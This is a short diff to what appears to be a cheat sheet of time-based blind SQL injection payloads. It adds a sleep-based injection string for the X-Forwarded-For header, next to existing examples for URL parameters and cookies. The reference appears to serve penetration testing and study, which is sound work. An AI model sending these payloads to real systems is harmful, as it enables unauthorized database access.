@@ -8,6 +8,8 @@ ___
 
 ### Examples
 ```sql
+X-Forwarded-For: "' or sleep(30)='" >> For any type of HTTP headers
+
 &topsort=flowers or sleep(3) >> Url
 
 &location=(select*from(select(sleep(3)))a) >> Cookie
